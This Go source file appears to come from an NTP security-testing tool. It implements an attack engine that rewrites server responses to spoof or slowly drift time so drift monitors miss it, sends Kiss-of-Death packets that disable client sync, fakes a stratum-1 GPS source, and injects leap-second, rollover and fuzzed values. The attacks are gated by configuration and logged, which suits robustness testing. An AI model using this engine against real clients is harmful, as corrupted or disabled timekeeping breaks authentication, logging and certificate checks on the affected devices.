// Package attacks implements NTP security testing attacks
package attacks

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"sync"
	"time"

	"github.com/neutrinoguy/timehammer/internal/config"
	"github.com/neutrinoguy/timehammer/internal/logger"
	"github.com/neutrinoguy/timehammer/pkg/ntpcore"
)

// AttackType represents the type of attack
type AttackType string

const (
	AttackNone         AttackType = ""
	AttackTimeSpoofing AttackType = "time_spoofing"
	AttackTimeDrift    AttackType = "time_drift"
	AttackKissOfDeath  AttackType = "kiss_of_death"
	AttackStratumLie   AttackType = "stratum_attack"
	AttackLeapSecond   AttackType = "leap_second"
	AttackRollover     AttackType = "rollover"
	AttackClockStep    AttackType = "clock_step"
	AttackFuzzing      AttackType = "fuzzing"
)

// AttackInfo provides information about an attack
type AttackInfo struct {
	Type        AttackType `json:"type"`
	Name        string     `json:"name"`
	Description string     `json:"description"`
	CVE         string     `json:"cve,omitempty"`
	Severity    string     `json:"severity"`
}

// GetAvailableAttacks returns information about all available attacks
func GetAvailableAttacks() []AttackInfo {
	return []AttackInfo{
		{
			Type:        AttackTimeSpoofing,
			Name:        "Time Spoofing",
			Description: "Send clients a controlled fake time (future/past) to test how devices handle unexpected time values",
			Severity:    "Medium",
		},
		{
			Type:        AttackTimeDrift,
			Name:        "Gradual Time Drift",
			Description: "Slowly drift time forward or backward to evade detection by drift monitors",
			Severity:    "Low",
		},
		{
			Type:        AttackKissOfDeath,
			Name:        "Kiss-of-Death (KoD)",
			Description: "Send KoD packets with DENY/RATE codes to disable client synchronization",
			CVE:         "CVE-2015-7704, CVE-2015-7705",
			Severity:    "High",
		},
		{
			Type:        AttackStratumLie,
			Name:        "Stratum Manipulation",
			Description: "Lie about stratum level (claim stratum 1) to become the preferred time source",
			Severity:    "Medium",
		},
		{
			Type:        AttackLeapSecond,
			Name:        "Leap Second Injection",
			Description: "Inject leap indicator flags to trigger leap second handling bugs",
			Severity:    "Medium",
		},
		{
			Type:        AttackRollover,
			Name:        "Timestamp Rollover",
			Description: "Send timestamps near rollover boundaries (Y2K38, NTP Era 1) to test overflow handling",
			Severity:    "High",
		},
		{
			Type:        AttackClockStep,
			Name:        "Clock Step Attack",
			Description: "Sudden large time jumps to test client resilience to step changes",
			Severity:    "Medium",
		},
		{
			Type:        AttackFuzzing,
			Name:        "Client Fuzzing",
			Description: "Randomly mutates NTP fields, timestamps, and headers to test client robustness",
			Severity:    "Medium",
		},
	}
}

// AttackEngine handles attack execution
type AttackEngine struct {
	mu           sync.RWMutex
	cfg          *config.Config
	log          *logger.Logger
	driftState   *DriftState
	requestCount map[string]int // per-client request count for interval-based attacks
}

// DriftState tracks gradual drift
type DriftState struct {
	StartTime    time.Time
	CurrentDrift time.Duration
	LastUpdate   time.Time
}

// NewAttackEngine creates a new attack engine
func NewAttackEngine(cfg *config.Config) *AttackEngine {
	return &AttackEngine{
		cfg:          cfg,
		log:          logger.GetLogger(),
		driftState:   &DriftState{StartTime: time.Now()},
		requestCount: make(map[string]int),
	}
}

// UpdateConfig updates the attack engine configuration
func (e *AttackEngine) UpdateConfig(cfg *config.Config) {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.cfg = cfg
}

// IsEnabled returns whether security mode is enabled
func (e *AttackEngine) IsEnabled() bool {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.cfg.Security.Enabled
}

// GetActiveAttack returns the currently active attack type
func (e *AttackEngine) GetActiveAttack() AttackType {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return AttackType(e.cfg.Security.ActiveAttack)
}

// ProcessPacket applies the active attack to an NTP response packet
// Returns the modified packet and the attack name (if any)
func (e *AttackEngine) ProcessPacket(packet *ntpcore.NTPPacket, clientAddr string, realTime time.Time) (*ntpcore.NTPPacket, string) {
	e.mu.Lock()
	defer e.mu.Unlock()

	if !e.cfg.Security.Enabled {
		return packet, ""
	}

	// Track request count for this client
	e.requestCount[clientAddr]++
	count := e.requestCount[clientAddr]

	attack := AttackType(e.cfg.Security.ActiveAttack)

	switch attack {
	case AttackTimeSpoofing:
		return e.applyTimeSpoofing(packet, realTime)
	case AttackTimeDrift:
		return e.applyTimeDrift(packet, realTime)
	case AttackKissOfDeath:
		return e.applyKissOfDeath(packet, clientAddr, count)
	case AttackStratumLie:
		return e.applyStratumLie(packet)
	case AttackLeapSecond:
		return e.applyLeapSecond(packet)
	case AttackRollover:
		return e.applyRollover(packet)
	case AttackClockStep:
		return e.applyClockStep(packet, realTime, count)
	case AttackFuzzing:
		return e.applyFuzzing(packet)
	default:
		return packet, ""
	}
}

// applyTimeSpoofing sends a fake time
func (e *AttackEngine) applyTimeSpoofing(packet *ntpcore.NTPPacket, realTime time.Time) (*ntpcore.NTPPacket, string) {
	cfg := e.cfg.Security.TimeSpoofing
	if !cfg.Enabled {
		return packet, ""
	}

	var fakeTime time.Time

	// Check if custom time is set
	if cfg.CustomTime != "" {
		parsed, err := time.Parse(time.RFC3339, cfg.CustomTime)
		if err == nil {
			fakeTime = parsed
		} else {
			fakeTime = realTime.Add(time.Duration(cfg.OffsetSecs) * time.Second)
		}
	} else {
		fakeTime = realTime.Add(time.Duration(cfg.OffsetSecs) * time.Second)
	}

	packet.SetReceiveTime(fakeTime)
	packet.SetTransmitTime(fakeTime)
	packet.SetReferenceTime(fakeTime.Add(-time.Second))

	e.log.LogAttack(string(AttackTimeSpoofing), "all",
		fmt.Sprintf("Sending fake time: %s (offset: %ds)", fakeTime.Format(time.RFC3339), cfg.OffsetSecs))

	return packet, "Time Spoofing"
}

// applyTimeDrift gradually shifts time
func (e *AttackEngine) applyTimeDrift(packet *ntpcore.NTPPacket, realTime time.Time) (*ntpcore.NTPPacket, string) {
	cfg := e.cfg.Security.TimeDrift
	if !cfg.Enabled {
		return packet, ""
	}

	// Calculate drift since start
	elapsed := time.Since(e.driftState.StartTime).Seconds()
	driftAmount := elapsed * cfg.DriftPerSec

	// Cap at max drift
	if driftAmount > cfg.MaxDrift {
		driftAmount = cfg.MaxDrift
	}

	driftDuration := time.Duration(driftAmount * float64(time.Second))
	if cfg.Direction == "backward" {
		driftDuration = -driftDuration
	}

	e.driftState.CurrentDrift = driftDuration
	e.driftState.LastUpdate = time.Now()

	fakeTime := realTime.Add(driftDuration)

	packet.SetReceiveTime(fakeTime)
	packet.SetTransmitTime(fakeTime)
	packet.SetReferenceTime(fakeTime.Add(-time.Second))

	e.log.LogAttack(string(AttackTimeDrift), "all",
		fmt.Sprintf("Drifting time %s by %v", cfg.Direction, driftDuration))

	return packet, "Time Drift"
}

// applyKissOfDeath sends KoD packets
func (e *AttackEngine) applyKissOfDeath(packet *ntpcore.NTPPacket, clientAddr string, requestCount int) (*ntpcore.NTPPacket, string) {
	cfg := e.cfg.Security.KissOfDeath
	if !cfg.Enabled {
		return packet, ""
	}

	// Check if we should send KoD based on interval
	if cfg.Interval > 0 && requestCount%cfg.Interval != 0 {
		return packet, ""
	}

	// Create KoD packet
	packet.Stratum = 0
	packet.LeapIndicator = ntpcore.LeapAlarm

	// Set the kiss code
	if err := packet.SetKissOfDeathCode(cfg.Code); err != nil {
		// Use DENY as fallback
		packet.SetKissOfDeathCode("DENY")
	}

	e.log.LogAttack(string(AttackKissOfDeath), clientAddr,
		fmt.Sprintf("Sending KoD packet with code: %s", cfg.Code))

	return packet, fmt.Sprintf("Kiss-of-Death (%s)", cfg.Code)
}

// applyStratumLie lies about stratum level
func (e *AttackEngine) applyStratumLie(packet *ntpcore.NTPPacket) (*ntpcore.NTPPacket, string) {
	cfg := e.cfg.Security.StratumAttack
	if !cfg.Enabled {
		return packet, ""
	}

	packet.Stratum = uint8(cfg.FakeStratum)

	// If claiming stratum 1, set a fake reference ID (like a GPS source)
	if cfg.FakeStratum == 1 {
		packet.ReferenceID = binary.BigEndian.Uint32([]byte("GPS\x00"))
	}

	e.log.LogAttack(string(AttackStratumLie), "all",
		fmt.Sprintf("Claiming stratum %d to appear more authoritative", cfg.FakeStratum))

	return packet, fmt.Sprintf("Stratum Lie (%d)", cfg.FakeStratum)
}

// applyLeapSecond injects leap second indicators
func (e *AttackEngine) applyLeapSecond(packet *ntpcore.NTPPacket) (*ntpcore.NTPPacket, string) {
	cfg := e.cfg.Security.LeapSecond
	if !cfg.Enabled {
		return packet, ""
	}

	packet.LeapIndicator = uint8(cfg.LeapIndicator)

	leapDesc := map[int]string{
		1: "+1 second",
		2: "-1 second",
		3: "alarm/unsynchronized",
	}

	e.log.LogAttack(string(AttackLeapSecond), "all",
		fmt.Sprintf("Injecting leap indicator: %d (%s)", cfg.LeapIndicator, leapDesc[cfg.LeapIndicator]))

	return packet, fmt.Sprintf("Leap Second (%s)", leapDesc[cfg.LeapIndicator])
}

// applyRollover sends timestamps near rollover boundaries
func (e *AttackEngine) applyRollover(packet *ntpcore.NTPPacket) (*ntpcore.NTPPacket, string) {
	cfg := e.cfg.Security.Rollover
	if !cfg.Enabled {
		return packet, ""
	}

	var rolloverTime time.Time
	var description string

	switch cfg.Mode {
	case "y2k38":
		// Y2K38: January 19, 2038 03:14:07 UTC (Unix 32-bit overflow)
		rolloverTime = time.Date(2038, 1, 19, 3, 14, 7, 0, time.UTC)
		description = "Y2K38 (Unix 32-bit overflow)"
	case "ntp_era":
		// NTP Era 1: February 7, 2036 06:28:16 UTC (NTP timestamp rollover)
		rolloverTime = time.Date(2036, 2, 7, 6, 28, 16, 0, time.UTC)
		description = "NTP Era 1 rollover"
	case "custom":
		rolloverTime = time.Date(cfg.TargetYear, 1, 1, 0, 0, 0, 0, time.UTC)
		description = fmt.Sprintf("Custom year %d", cfg.TargetYear)
	default:
		rolloverTime = time.Date(2038, 1, 19, 3, 14, 7, 0, time.UTC)
		description = "Y2K38"
	}

	packet.SetReceiveTime(rolloverTime)
	packet.SetTransmitTime(rolloverTime)
	packet.SetReferenceTime(rolloverTime.Add(-time.Second))

	e.log.LogAttack(string(AttackRollover), "all",
		fmt.Sprintf("Sending rollover timestamp: %s (%s)", rolloverTime.Format(time.RFC3339), description))

	return packet, fmt.Sprintf("Rollover (%s)", description)
}

// applyClockStep applies sudden time jumps
func (e *AttackEngine) applyClockStep(packet *ntpcore.NTPPacket, realTime time.Time, requestCount int) (*ntpcore.NTPPacket, string) {
	cfg := e.cfg.Security.ClockStep
	if !cfg.Enabled {
		return packet, ""
	}

	// Check if we should apply step based on interval
	if cfg.Interval > 0 && requestCount%cfg.Interval != 0 {
		return packet, ""
	}

	stepDuration := time.Duration(cfg.StepSecs) * time.Second
	steppedTime := realTime.Add(stepDuration)

	packet.SetReceiveTime(steppedTime)
	packet.SetTransmitTime(steppedTime)
	packet.SetReferenceTime(steppedTime.Add(-time.Second))

	e.log.LogAttack(string(AttackClockStep), "all",
		fmt.Sprintf("Applying clock step: %v (request #%d)", stepDuration, requestCount))

	return packet, fmt.Sprintf("Clock Step (+%ds)", cfg.StepSecs)
}

// ResetDriftState resets the drift tracking
func (e *AttackEngine) ResetDriftState() {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.driftState = &DriftState{StartTime: time.Now()}
}

// ResetRequestCounts resets per-client request counters
func (e *AttackEngine) ResetRequestCounts() {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.requestCount = make(map[string]int)
}

// GetDriftStatus returns current drift status
func (e *AttackEngine) GetDriftStatus() (time.Duration, time.Duration) {
	e.mu.RLock()
	defer e.mu.RUnlock()
	elapsed := time.Since(e.driftState.StartTime)
	return e.driftState.CurrentDrift, elapsed
}

// ApplyPreset applies an attack preset
func (e *AttackEngine) ApplyPreset(preset config.AttackPreset) error {
	e.mu.Lock()
	defer e.mu.Unlock()

	e.cfg.Security.Enabled = true
	e.cfg.Security.ActiveAttack = preset.Attack

	// Apply preset-specific config
	switch preset.Attack {
	case "time_spoofing":
		if offset, ok := preset.Config["offset_secs"].(int); ok {
			e.cfg.Security.TimeSpoofing.Enabled = true
			e.cfg.Security.TimeSpoofing.OffsetSecs = int64(offset)
		}
		if offset, ok := preset.Config["offset_secs"].(float64); ok {
			e.cfg.Security.TimeSpoofing.Enabled = true
			e.cfg.Security.TimeSpoofing.OffsetSecs = int64(offset)
		}
	case "time_drift":
		e.cfg.Security.TimeDrift.Enabled = true
		if drift, ok := preset.Config["drift_per_sec"].(float64); ok {
			e.cfg.Security.TimeDrift.DriftPerSec = drift
		}
		if max, ok := preset.Config["max_drift"].(float64); ok {
			e.cfg.Security.TimeDrift.MaxDrift = max
		}
		if max, ok := preset.Config["max_drift"].(int); ok {
			e.cfg.Security.TimeDrift.MaxDrift = float64(max)
		}
		if dir, ok := preset.Config["direction"].(string); ok {
			e.cfg.Security.TimeDrift.Direction = dir
		}
		e.driftState = &DriftState{StartTime: time.Now()}
	case "kiss_of_death":
		e.cfg.Security.KissOfDeath.Enabled = true
		if code, ok := preset.Config["code"].(string); ok {
			e.cfg.Security.KissOfDeath.Code = code
		}
		if interval, ok := preset.Config["interval"].(int); ok {
			e.cfg.Security.KissOfDeath.Interval = interval
		}
	case "rollover":
		e.cfg.Security.Rollover.Enabled = true
		if year, ok := preset.Config["target_year"].(int); ok {
			e.cfg.Security.Rollover.TargetYear = year
		}
		if mode, ok := preset.Config["mode"].(string); ok {
			e.cfg.Security.Rollover.Mode = mode
		}
	case "clock_step":
		e.cfg.Security.ClockStep.Enabled = true
		if step, ok := preset.Config["step_secs"].(int); ok {
			e.cfg.Security.ClockStep.StepSecs = int64(step)
		}
		if interval, ok := preset.Config["interval"].(int); ok {
			e.cfg.Security.ClockStep.Interval = interval
		}
	case "fuzzing":
		e.cfg.Security.Fuzzing.Enabled = true
		if mode, ok := preset.Config["mode"].(string); ok {
			e.cfg.Security.Fuzzing.Mode = mode
		}
	}

	return nil
}

// DisableAllAttacks disables all attacks
func (e *AttackEngine) DisableAllAttacks() {
	e.mu.Lock()
	defer e.mu.Unlock()

	e.cfg.Security.Enabled = false
	e.cfg.Security.ActiveAttack = ""
	e.cfg.Security.TimeSpoofing.Enabled = false
	e.cfg.Security.TimeDrift.Enabled = false
	e.cfg.Security.KissOfDeath.Enabled = false
	e.cfg.Security.StratumAttack.Enabled = false
	e.cfg.Security.LeapSecond.Enabled = false
	e.cfg.Security.Rollover.Enabled = false
	e.cfg.Security.ClockStep.Enabled = false
	e.cfg.Security.Fuzzing.Enabled = false
}

// applyFuzzing applies random fuzzing mutations
func (e *AttackEngine) applyFuzzing(packet *ntpcore.NTPPacket) (*ntpcore.NTPPacket, string) {
	if !e.cfg.Security.Fuzzing.Enabled {
		return packet, ""
	}

	mutationType := rand.Intn(10)
	mutationName := "Generic Fuzzing"

	switch mutationType {
	case 0: // Version Fuzzing
		v := uint8(rand.Intn(8))
		if v == 3 || v == 4 {
			// Try to pick an invalid one again
			v = uint8(rand.Intn(8))
		}
		packet.Version = v
		mutationName = fmt.Sprintf("Fuzz: Version %d", v)
	case 1: // Mode Fuzzing
		m := uint8(rand.Intn(8))
		if m == 4 { // Server
			m = 0 // Reserved
		}
		packet.Mode = m
		mutationName = fmt.Sprintf("Fuzz: Mode %d", m)
	case 2: // Stratum Fuzzing
		s := uint8(rand.Intn(20))
		if s == 0 {
			s = 16 // Unsynced
		} else if s > 16 {
			s = 0 // Invalid/KoD without code
		}
		packet.Stratum = s
		mutationName = fmt.Sprintf("Fuzz: Stratum %d", s)
	case 3: // Leap Indicator
		packet.LeapIndicator = 3 // Alarm
		mutationName = "Fuzz: LI Alarm"
	case 4: // Zero Timestamp
		packet.SetReceiveTime(time.Time{})
		packet.SetTransmitTime(time.Time{})
		packet.SetReferenceTime(time.Time{})
		mutationName = "Fuzz: Zero Timestamps"
	case 5: // Max Timestamp
		packet.RecvTimeSec = 0xFFFFFFFF
		packet.RecvTimeFrac = 0xFFFFFFFF
		packet.XmitTimeSec = 0xFFFFFFFF
		packet.XmitTimeFrac = 0xFFFFFFFF
		mutationName = "Fuzz: Max Timestamps"
	case 6: // Root Delay/Dispersion
		packet.RootDelay = 0xFFFF0000
		packet.RootDisp = 0xFFFF0000
		mutationName = "Fuzz: Large Root Delay"
	case 7: // Reference ID
		packet.ReferenceID = 0x41414141 // AAAA
		mutationName = "Fuzz: RefID AAAA"
	case 8: // Origin Timestamp Mismatch
		packet.OrigTimeSec++
		mutationName = "Fuzz: Origin Mismatch"
	case 9: // Poll/Precision
		packet.Poll = -100
		packet.Precision = 100
		mutationName = "Fuzz: Invalid Poll/Prec"
	}

	e.log.LogAttack(string(AttackFuzzing), "all", mutationName)
	return packet, mutationName
}
